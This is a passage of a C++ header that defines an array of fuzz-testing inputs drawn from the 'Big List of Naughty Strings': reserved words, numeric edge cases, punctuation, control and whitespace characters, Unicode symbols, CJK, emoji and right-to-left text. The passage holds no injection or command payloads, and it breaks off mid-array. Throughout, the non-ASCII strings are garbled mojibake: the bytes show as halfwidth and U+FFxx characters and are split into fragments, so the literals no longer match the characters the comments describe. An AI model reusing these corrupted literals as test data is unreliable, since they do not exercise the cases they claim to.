#pragma once

// clang-format off

const std::string naughty_strings[] = {
    // sourced from
    // https://raw.githubusercontent.com/minimaxir/big-list-of-naughty-strings/master/blns.txt

    //	Reserved Strings
    //
    //	Strings which may be used elsewhere in code

    "undefined", "undef", "null", "NULL", "(null)", "nil", "NIL", "true",
    "false", "True", "False", "TRUE", "FALSE", "None", "hasOwnProperty", "\\",
    "\\\\",

    //	Numeric Strings
    //
    //	Strings which can be interpreted as numeric

    "0", "1", "1.00", "$1.00", "1/2", "1E2", "1E02", "1E+02", "-1", "-1.00",
    "-$1.00", "-1/2", "-1E2", "-1E02", "-1E+02", "1/0", "0/0", "-2147483648/-1",
    "-9223372036854775808/-1", "-0", "-0.0", "+0", "+0.0", "0.00", "0..0", ".",
    "0.0.0", "0,00", "0,,0", ",", "0,0,0", "0.0/0", "1.0/0.0", "0.0/0.0",
    "1,0/0,0", "0,0/0,0", "--1", "-", "-.", "-,",
    "99999999999999999999999999999999999999999999999999999999999999999999999999"
    "9999999999999999999999",
    "NaN", "Infinity", "-Infinity", "INF", "1#INF", "-1#IND", "1#QNAN",
    "1#SNAN", "1#IND", "0x0", "0xffffffff", "0xffffffffffffffff", "0xabad1dea",
    "123456789012345678901234567890123456789", "1,000.00", "1 000.00",
    "1'000.00", "1,000,000.00", "1 000 000.00", "1'000'000.00", "1.000,00",
    "1 000,00", "1'000,00", "1.000.000,00", "1 000 000,00", "1'000'000,00",
    "01000", "08", "09", "2.2250738585072011e-308",

    //	Special Characters
    //
    // ASCII punctuation.  All of these characters may need to be escaped in
    // some
    // contexts.  Divided into three groups based on (US-layout) keyboard
    // position.

    ",./;'[]\\-=", "<>?:\"{}|_+", "!@#$%^&*()`~",

    // Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,
    // and U+007F (DEL)
    // Often forbidden to appear in various text-based file formats (e.g. XML),
    // or reused for internal delimiters on the theory that they should never
    // appear in input.
    // The next line may appear to be blank or mojibake in some viewers.
    "",

    // Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through
    // U+009F.
    // Commonly misinterpreted as additional graphic characters.
    // The next line may appear to be blank, mojibake, or dingbats in some
    // viewers.
    "ￂﾀￂﾁￂﾂￂﾃￂﾄￂﾆￂﾇￂﾈￂﾉￂﾊￂﾋￂﾌￂﾍￂﾎￂﾏￂﾐￂﾑￂﾒￂﾓￂﾔￂﾕￂﾖￂﾗￂﾘￂﾙￂﾚￂﾛￂﾜￂﾝￂﾞￂﾟ",

    // Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode
    // version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),
    // and U+200B (ZERO WIDTH SPACE), which are in the C categories but are
    // often
    // treated as whitespace in some contexts.
    // This file unfortunately cannot express strings containing
    // U+0000, U+000A, or U+000D (NUL, LF, CR).
    // The next line may appear to be blank or mojibake in some viewers.
    // The next line may be flagged for \"trailing whitespace\" in some viewers.
    "	",
    " ￂﾅ "
    "￡ﾚﾀ￢ﾀﾀ￢ﾀﾁ￢ﾀﾂ￢ﾀﾃ￢ﾀﾄ￢ﾀﾅ￢ﾀﾆ￢ﾀﾇ￢ﾀﾈ￢ﾀﾉ￢ﾀﾊ￢ﾀﾋ￢ﾀﾨ￢ﾀﾩ￢ﾀﾯ￢ﾁﾟ￣ﾀﾀ",

    // Unicode additional control characters: all of the characters with
    // general category Cf (in Unicode 8.0.0).
    // The next line may appear to be blank or mojibake in some viewers.
    "ￂﾭ￘ﾀ￘ﾁ￘ﾂ￘ﾃ￘ﾄ￘ﾅ￘ﾜￛﾝￜﾏ￡ﾠﾎ￢"
    "ﾀ"
    "ﾋ"
    "￢"
    "ﾀ"
    "ﾌ"
    "￢"
    "ﾀ"
    "ﾍ"
    "￢"
    "ﾀ"
    "ﾎ"
    "￢"
    "ﾀ"
    "ﾏ"
    "￢"
    "ﾀ"
    "ﾪ"
    "￢"
    "ﾀ"
    "ﾫ"
    "￢"
    "ﾀ"
    "ﾬ"
    "￢"
    "ﾀﾭ￢ﾀﾮ￢ﾁﾠ￢ﾁﾡ￢ﾁﾢ￢ﾁﾣ￢ﾁﾤ￢ﾁﾦ￢"
    "ﾁ"
    "ﾧ"
    "￢"
    "ﾁ"
    "ﾨ"
    "￢"
    "ﾁ"
    "ﾩ"
    "￢"
    "ﾁ"
    "ﾪ"
    "￢"
    "ﾁ"
    "ﾫ"
    "￢"
    "ﾁ"
    "ﾬ"
    "￢"
    "ﾁ"
    "ﾭ"
    "￢"
    "ﾁ"
    "ﾮ"
    "￢"
    "ﾁ"
    "ﾯ"
    "￯"
    "ﾻ"
    "﾿￯"
    "﾿ﾹ￯﾿ﾺ￯﾿ﾻ￰ﾑﾂﾽ￰ﾛﾲﾠ￰ﾛﾲﾡ￰ﾛﾲﾢ"
    "￰"
    "ﾛ"
    "ﾲ"
    "ﾣ"
    "￰"
    "ﾝ"
    "ﾅ"
    "ﾳ"
    "￰"
    "ﾝ"
    "ﾅ"
    "ﾴ"
    "￰"
    "ﾝ"
    "ﾅ"
    "ﾵ"
    "￰"
    "ﾝ"
    "ﾅ"
    "ﾶ"
    "￰ﾝﾅﾷ￰ﾝﾅﾸ￰ﾝﾅﾹ￰ﾝﾅﾺ￳ﾠﾀﾁ￳ﾠﾀﾠ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾡ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾢ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾣ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾤ"
    "￳ﾠ"
    "ﾀﾥ￳ﾠﾀﾦ￳ﾠﾀﾧ￳ﾠﾀﾨ￳ﾠﾀﾩ￳ﾠﾀﾪ￳ﾠ"
    "ﾀ"
    "ﾫ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾬ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾭ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾮ"
    "￳ﾠﾀﾯ￳ﾠﾀﾰ￳ﾠﾀﾱ￳ﾠﾀﾲ￳ﾠﾀﾳ￳ﾠﾀﾴ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾵ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾶ"
    "￳"
    "ﾠ"
    "ﾀ"
    "ﾷ"
    "￳ﾠﾀﾸ"
    "￳ﾠﾀﾹ￳ﾠﾀﾺ￳ﾠﾀﾻ￳ﾠﾀﾼ￳ﾠﾀﾽ￳ﾠﾀﾾ"
    "￳"
    "ﾠ"
    "ﾀ"
    "﾿"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾀ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾁ"
    "￳ﾠﾁﾂ￳ﾠﾁﾃ￳ﾠﾁﾄ￳ﾠﾁﾅ￳ﾠﾁﾆ￳ﾠﾁﾇ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾈ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾉ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾊ"
    "￳ﾠﾁﾋ"
    "￳ﾠﾁﾌ￳ﾠﾁﾍ￳ﾠﾁﾎ￳ﾠﾁﾏ￳ﾠﾁﾐ￳ﾠﾁﾑ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾒ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾓ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾔ"
    "￳ﾠﾁﾕ￳ﾠﾁﾖ￳ﾠﾁﾗ￳ﾠﾁﾘ￳ﾠﾁﾙ￳ﾠﾁﾚ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾛ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾜ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾝ"
    "￳ﾠﾁﾞ"
    "￳ﾠﾁﾟ￳ﾠﾁﾠ￳ﾠﾁﾡ￳ﾠﾁﾢ￳ﾠﾁﾣ￳ﾠﾁﾤ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾥ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾦ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾧ"
    "￳ﾠﾁﾨ￳ﾠﾁﾩ￳ﾠﾁﾪ￳ﾠﾁﾫ￳ﾠﾁﾬ￳ﾠﾁﾭ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾮ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾯ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾰ"
    "￳ﾠﾁﾱ"
    "￳ﾠﾁﾲ￳ﾠﾁﾳ￳ﾠﾁﾴ￳ﾠﾁﾵ￳ﾠﾁﾶ￳ﾠﾁﾷ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾸ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾹ"
    "￳"
    "ﾠ"
    "ﾁ"
    "ﾺ"
    "￳ﾠﾁﾻ￳ﾠﾁﾼ￳ﾠﾁﾽ￳ﾠﾁﾾ￳ﾠﾁ"
    "﾿",

    // \"Byte order marks\", U+FEFF and U+FFFE, each on its own line.
    // The next two lines may appear to be blank or mojibake in some viewers.
    "￯ﾻ﾿", "￯﾿ﾾ",

    //	Unicode Symbols
    //
    //	Strings which contain common unicode symbols (e.g. smart quotes)

    "ￎﾩ￢ﾉﾈￃﾧ￢ﾈﾚ￢ﾈﾫￋﾜￂﾵ￢ﾉﾤ￢ﾉﾥￃﾷ", "ￃﾥￃﾟ￢ﾈﾂￆﾒￂﾩￋﾙ￢ﾈﾆￋﾚￂﾬ￢ﾀﾦￃﾦ",
    "ￅﾓ￢ﾈﾑￂﾴￂﾮ￢ﾀﾠￂﾥￂﾨￋﾆￃﾸￏﾀ￢ﾀ"
    "ﾜ"
    "￢"
    "ﾀ"
    "ﾘ",
    "ￂﾡ￢ﾄﾢￂﾣￂﾢ￢ﾈﾞￂﾧￂﾶ￢ﾀﾢￂﾪￂﾺ￢ﾀﾓ￢ﾉ"
    "ﾠ",
    "ￂﾸￋﾛￃﾇ￢ﾗﾊￄﾱￋﾜￃﾂￂﾯￋﾘￂ﾿",
    "ￃﾅￃﾍￃﾎￃﾏￋﾝￃﾓￃﾔ￯ﾣ﾿ￃﾒￃﾚￃﾆ￢"
    "ﾘ"
    "ﾃ",
    "ￅﾒ￢ﾀﾞￂﾴ￢ﾀﾰￋﾇￃﾁￂﾨￋﾆￃﾘ￢ﾈﾏ￢ﾀﾝ￢ﾀﾙ",
    "`￢ﾁﾄ￢ﾂﾬ￢ﾀﾹ￢ﾀﾺ￯ﾬﾁ￯ﾬﾂ￢ﾀﾡￂﾰￂ"
    "ﾷ"
    "￢"
    "ﾀ"
    "ﾚ"
    "￢"
    "ﾀ"
    "ﾔ"
    "ￂ"
    "ﾱ",
    "￢ﾅﾛ￢ﾅﾜ￢ﾅﾝ￢ﾅﾞ",
    "￐ﾁ￐ﾂ￐ﾃ￐ﾄ￐ﾅ￐ﾆ￐ﾇ￐ﾈ￐ﾉ￐ﾊ￐ﾋ￐ﾌ"
    "￐"
    "ﾍ"
    "￐"
    "ﾎ"
    "￐"
    "ﾏ"
    "￐"
    "ﾐ"
    "￐"
    "ﾑ"
    "￐"
    "ﾒ"
    "￐ﾓ￐ﾔ￐ﾕ￐ﾖ￐ﾗ￐ﾘ￐ﾙ￐ﾚ￐ﾛ￐ﾜ￐ﾝ￐ﾞ"
    "￐"
    "ﾟ"
    "￐"
    "ﾠ"
    "￐"
    "ﾡ"
    "￐"
    "ﾢ"
    "￐"
    "ﾣ"
    "￐"
    "ﾤ"
    "￐ﾥ￐ﾦ"
    "￐ﾧ￐ﾨ￐ﾩ￐ﾪ￐ﾫ￐ﾬ￐ﾭ￐ﾮ￐ﾯ￐ﾰ￐ﾱ￐ﾲ"
    "￐"
    "ﾳ"
    "￐"
    "ﾴ"
    "￐"
    "ﾵ"
    "￐"
    "ﾶ"
    "￐"
    "ﾷ"
    "￐"
    "ﾸ"
    "￐ﾹ￐ﾺ￐ﾻ￐ﾼ￐ﾽ￐ﾾ￐﾿￑ﾀ￑ﾁ￑ﾂ￑ﾃ￑ﾄ"
    "￑"
    "ﾅ"
    "￑"
    "ﾆ"
    "￑"
    "ﾇ"
    "￑"
    "ﾈ"
    "￑"
    "ﾉ"
    "￑"
    "ﾊ"
    "￑ﾋ￑ﾌ"
    "￑ﾍ￑ﾎ￑ﾏ",
    "￙ﾠ￙ﾡ￙ﾢ￙ﾣ￙ﾤ￙ﾥ￙ﾦ￙ﾧ￙ﾨ￙ﾩ",

    //	Unicode Subscript/Superscript/Accents
    //
    //	Strings which contain unicode subscripts/superscripts; can cause
    // rendering issues

    "￢ﾁﾰ￢ﾁﾴ￢ﾁﾵ", "￢ﾂﾀ￢ﾂﾁ￢ﾂﾂ", "￢ﾁﾰ￢ﾁﾴ￢ﾁﾵ￢ﾂﾀ￢ﾂﾁ￢ﾂﾂ",
    "￠ﾸﾔ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠"
    "ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ"
    "￠ﾹﾉ￠"
    "ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠"
    "ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ "
    "￠ﾸﾔ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠"
    "ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ"
    "￠ﾹﾉ￠"
    "ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠"
    "ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ "
    "￠ﾸﾔ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠"
    "ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ"
    "￠ﾹﾉ￠"
    "ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠"
    "ﾹﾇ￠ﾹﾇ"
    "￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾉ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ￠ﾹﾇ",

    //	Quotation Marks
    //
    //	Strings which contain misplaced quotation marks; can cause encoding
    // errors

    "'", "\"", "''", "\"\"", "'\"'", "\"''''\"'\"", "\"'\"'\"''''\"",
    "<foo val=￢ﾀﾜbar￢ﾀﾝ />", "<foo val=￢ﾀﾜbar￢ﾀﾝ />",
    "<foo val=￢ﾀﾝbar￢ﾀﾜ />", "<foo val=`bar' />",

    //	Two-Byte Characters
    //
    //	Strings which contain two-byte characters: can cause rendering issues or
    // character-length issues

    "￧ﾔﾰ￤ﾸﾭ￣ﾁﾕ￣ﾂﾓ￣ﾁﾫ￣ﾁﾂ￣ﾁﾒ￣ﾁﾦ"
    "￤"
    "ﾸ"
    "ﾋ"
    "￣"
    "ﾁ"
    "ﾕ"
    "￣"
    "ﾁ"
    "ﾄ",
    "￣ﾃﾑ￣ﾃﾼ￣ﾃﾆ￣ﾂﾣ￣ﾃﾼ￣ﾁﾸ￨ﾡﾌ￣ﾁﾋ￣ﾁﾪ￣ﾁﾄ￣ﾁﾋ", "￥ﾒﾌ￨ﾣﾽ￦ﾼﾢ￨ﾪﾞ",
    "￩ﾃﾨ￨ﾐﾽ￦ﾠﾼ", "￬ﾂﾬ￭ﾚﾌ￪ﾳﾼ￭ﾕﾙ￬ﾛﾐ ￬ﾖﾴ￭ﾕﾙ￬ﾗﾰ￪ﾵﾬ￬ﾆﾌ",
    "￬ﾰﾦ￬ﾰﾨ￫ﾥﾼ ￭ﾃﾀ￪ﾳﾠ ￬ﾘﾨ "
    "￭ﾎﾲ￬ﾋﾜ￫ﾧﾨ￪ﾳﾼ "
    "￬ﾑﾛ￫ﾋﾤ￫ﾦﾬ "
    "￫ﾘﾠ￫ﾰﾩ￪ﾰﾁ￭ﾕﾘ",
    "￧ﾤﾾ￦ﾜﾃ￧ﾧﾑ￥ﾭﾸ￩ﾙﾢ￨ﾪﾞ￥ﾭﾸ￧ﾠﾔ"
    "￧"
    "ﾩ"
    "ﾶ"
    "￦"
    "ﾉ"
    "ﾀ",
    "￬ﾚﾸ￫ﾞﾀ￫ﾰﾔ￭ﾆﾠ￫ﾥﾴ",
    "￰ﾠﾜﾎ￰ﾠﾜﾱ￰ﾠﾝﾹ￰ﾠﾱﾓ￰ﾠﾱﾸ￰ﾠﾲﾖ"
    "￰"
    "ﾠ"
    "ﾳ"
    "ﾏ",

    //	Changing length when lowercased
    //
    //	Characters which increase in length (2 to 3 bytes) when lowercased
    //	Credit: https://twitter.com/jifa/status/625776454479970304

    "￈ﾺ", "￈ﾾ",

    //	Japanese Emoticons
    //
    //	Strings which consists of Japanese-style emoticons which are popular on
    // the web

    "￣ﾃﾽ￠ﾼﾼ￠ﾺﾈ￙ﾄￍﾜ￠ﾺﾈ￠ﾼﾽ￯ﾾﾉ "
    "￣ﾃﾽ￠ﾼﾼ￠ﾺﾈ￙ﾄￍﾜ￠ﾺﾈ￠ﾼﾽ￯ﾾﾉ",
    "(￯ﾽﾡ￢ﾗﾕ ￢ﾈﾀ ￢ﾗﾕ￯ﾽﾡ)",
    "￯ﾽﾀ￯ﾽﾨ(ￂﾴ￢ﾈﾀ￯ﾽﾀ￢ﾈﾩ", "__￯ﾾﾛ(,_,*)",
    "￣ﾃﾻ(￯﾿ﾣ￢ﾈﾀ￯﾿ﾣ)￣ﾃﾻ:*:",
    "￯ﾾﾟ￯ﾽﾥ￢ﾜ﾿￣ﾃﾾ￢ﾕﾲ("
    "￯ﾽﾡ￢ﾗﾕ￢ﾀ﾿￢ﾗﾕ￯ﾽﾡ)"
    "￢ﾕﾱ￢ﾜ﾿￯ﾽﾥ￯ﾾﾟ",
    ",￣ﾀﾂ￣ﾃﾻ:*:￣ﾃﾻ￣ﾂﾜ￢ﾀﾙ( ￢ﾘﾻ ￏﾉ ￢ﾘﾻ )￣ﾀﾂ￣ﾃﾻ:*:￣ﾃﾻ￣ﾂﾜ￢ﾀﾙ",
    "(￢ﾕﾯￂﾰ￢ﾖﾡￂﾰ￯ﾼﾉ￢ﾕﾯ￯ﾸﾵ "
    "￢ﾔﾻ￢ﾔﾁ￢ﾔﾻ)",
    "(￯ﾾﾉ￠ﾲﾥ￧ﾛﾊ￠ﾲﾥ￯ﾼﾉ￯ﾾﾉ￯ﾻ﾿ "
    "￢ﾔﾻ￢ﾔﾁ￢ﾔﾻ",
    "￢ﾔﾬ￢ﾔﾀ￢ﾔﾬ￣ﾃﾎ( ￂﾺ _ ￂﾺ￣ﾃﾎ)", "( ￍﾡￂﾰ ￍﾜￊﾖ ￍﾡￂﾰ)",

    //	Emoji
    //
    //	Strings which contain Emoji; should be the same behavior as two-byte
    // characters, but not always

    "￰ﾟﾘﾍ", "￰ﾟﾑﾩ￰ﾟﾏﾽ",
    "￰ﾟﾑﾾ ￰ﾟﾙﾇ ￰ﾟﾒﾁ ￰ﾟﾙﾅ ￰ﾟﾙﾆ "
    "￰ﾟﾙﾋ "
    "￰ﾟﾙﾎ "
    "￰ﾟﾙﾍ",
    "￰ﾟﾐﾵ ￰ﾟﾙﾈ ￰ﾟﾙﾉ ￰ﾟﾙﾊ",
    "￢ﾝﾤ￯ﾸﾏ ￰ﾟﾒﾔ ￰ﾟﾒﾌ ￰ﾟﾒﾕ ￰ﾟﾒﾞ "
    "￰ﾟﾒﾓ "
    "￰ﾟﾒﾗ "
    "￰ﾟﾒﾖ "
    "￰ﾟﾒﾘ "
    "￰ﾟﾒﾝ "
    "￰ﾟﾒﾟ ￰ﾟﾒﾜ ￰ﾟﾒﾛ ￰ﾟﾒﾚ "
    "￰ﾟﾒﾙ",
    "￢ﾜﾋ￰ﾟﾏ﾿ ￰ﾟﾒﾪ￰ﾟﾏ﾿ ￰ﾟﾑﾐ￰ﾟﾏ﾿ "
    "￰ﾟﾙﾌ￰ﾟﾏ﾿ "
    "￰ﾟﾑﾏ￰ﾟﾏ﾿ "
    "￰ﾟﾙﾏ￰ﾟﾏ﾿",
    "￰ﾟﾚﾾ ￰ﾟﾆﾒ ￰ﾟﾆﾓ ￰ﾟﾆﾕ ￰ﾟﾆﾖ "
    "￰ﾟﾆﾗ "
    "￰ﾟﾆﾙ "
    "￰ﾟﾏﾧ",
    "0￯ﾸﾏ￢ﾃﾣ 1￯ﾸﾏ￢ﾃﾣ 2￯ﾸﾏ￢ﾃﾣ "
    "3￯ﾸﾏ￢ﾃﾣ "
    "4￯ﾸﾏ￢ﾃﾣ "
    "5￯ﾸﾏ￢ﾃﾣ "
    "6￯ﾸﾏ￢ﾃﾣ 7￯ﾸﾏ￢ﾃﾣ 8￯ﾸﾏ￢ﾃﾣ "
    "9￯ﾸﾏ￢ﾃﾣ "
    "￰ﾟﾔﾟ",

    //       Regional Indicator Symbols
    //
    //       Regional Indicator Symbols can be displayed differently across
    //       fonts, and have a number of special behaviors

    "￰ﾟﾇﾺ￰ﾟﾇﾸ￰ﾟﾇﾷ￰ﾟﾇﾺ￰ﾟﾇﾸ "
    "￰ﾟﾇﾦ￰ﾟﾇﾫ￰ﾟﾇﾦ￰ﾟﾇﾲ￰ﾟﾇﾸ",
    "￰ﾟﾇﾺ￰ﾟﾇﾸ￰ﾟﾇﾷ￰ﾟﾇﾺ￰ﾟﾇﾸ￰ﾟﾇﾦ"
    "￰"
    "ﾟ"
    "ﾇ"
    "ﾫ"
    "￰"
    "ﾟ"
    "ﾇ"
    "ﾦ"
    "￰"
    "ﾟ"
    "ﾇ"
    "ﾲ",
    "￰ﾟﾇﾺ￰ﾟﾇﾸ￰ﾟﾇﾷ￰ﾟﾇﾺ￰ﾟﾇﾸ￰ﾟﾇﾦ",

    //	Unicode Numbers
    //
    //	Strings which contain unicode numbers; if the code is localized, it
    // should see the input as numeric

    "￯ﾼﾑ￯ﾼﾒ￯ﾼﾓ", "￙ﾡ￙ﾢ￙ﾣ",

    //	Right-To-Left Strings
    //
    //	Strings which contain text that should be rendered RTL if possible (e.g.
    // Arabic, Hebrew)

    "￘ﾫ￙ﾅ ￙ﾆ￙ﾁ￘ﾳ ￘ﾳ￙ﾂ￘ﾷ￘ﾪ "
    "￙ﾈ￘ﾨ￘ﾧ￙ﾄ￘ﾪ￘ﾭ￘ﾯ￙ﾊ￘ﾯ￘ﾌ, "
    "￘ﾬ￘ﾲ￙ﾊ￘ﾱ￘ﾪ￙ﾊ "
    "￘ﾨ￘ﾧ￘ﾳ￘ﾪ￘ﾮ￘ﾯ￘ﾧ￙ﾅ ￘ﾣ￙ﾆ "
    "￘ﾯ￙ﾆ￙ﾈ. ￘ﾥ￘ﾰ ￙ﾇ￙ﾆ￘ﾧ￘ﾟ "
    "￘ﾧ￙ﾄ￘ﾳ￘ﾪ￘ﾧ￘ﾱ "
    "￙ﾈ￘ﾪ￙ﾆ￘ﾵ￙ﾊ￘ﾨ ￙ﾃ￘ﾧ￙ﾆ. "
    "￘ﾣ￙ﾇ￙ﾑ￙ﾄ "
    "￘ﾧ￙ﾊ￘ﾷ￘ﾧ￙ﾄ￙ﾊ￘ﾧ￘ﾌ "
    "￘ﾨ￘ﾱ￙ﾊ￘ﾷ￘ﾧ￙ﾆ￙ﾊ￘ﾧ-"
    "￙ﾁ￘ﾱ￙ﾆ￘ﾳ￘ﾧ "
    "￙ﾂ￘ﾯ "
    "￘ﾣ￘ﾮ￘ﾰ. ￘ﾳ￙ﾄ￙ﾊ￙ﾅ￘ﾧ￙ﾆ￘ﾌ "
    "￘ﾥ￘ﾪ￙ﾁ￘ﾧ￙ﾂ￙ﾊ￘ﾩ "
    "￘ﾨ￙ﾊ￙ﾆ "
    "￙ﾅ￘ﾧ, ￙ﾊ￘ﾰ￙ﾃ￘ﾱ "
    "￘ﾧ￙ﾄ￘ﾭ￘ﾯ￙ﾈ￘ﾯ "
    "￘ﾣ￙ﾊ "
    "￘ﾨ￘ﾹ￘ﾯ, ￙ﾅ￘ﾹ￘ﾧ￙ﾅ￙ﾄ￘ﾩ "
    "￘ﾨ￙ﾈ￙ﾄ￙ﾆ￘ﾯ￘ﾧ￘ﾌ "
    "￘ﾧ￙ﾄ￘ﾥ￘ﾷ￙ﾄ￘ﾧ￙ﾂ ￘ﾹ￙ﾄ "
    "￘ﾥ￙ﾊ￙ﾈ.",
    "ￗﾑￖﾰￖﾼￗﾨￖﾵￗﾐￗﾩￖﾴￗﾁￗﾙￗﾪ, ￗﾑￖﾸￖﾼￗﾨￖﾸￗﾐ ￗﾐￖﾱￗﾜￖﾹￗﾔￖﾴￗﾙￗﾝ, ￗﾐￖﾵￗﾪ "
    "ￗﾔￖﾷￗﾩￖﾸￖﾼￗﾁￗﾞￖﾷￗﾙￖﾴￗﾝ, ￗﾕￖﾰￗﾐￖﾵￗﾪ ￗﾔￖﾸￗﾐￖﾸￗﾨￖﾶￗﾥ",
    "ￗﾔￖﾸￗﾙￖﾰￗﾪￖﾸￗﾔtest￘ﾧ￙ﾄ￘ﾵ￙ﾁ￘"
    "ﾭ"
    "￘"
    "ﾧ"
    "￘"
    "ﾪ"
    " "
    "￘ﾧ￙ﾄ￘ﾪ￙ﾑ￘ﾭ￙ﾈ￙ﾄ",
    "￯ﾷﾽ", "￯ﾷﾺ",
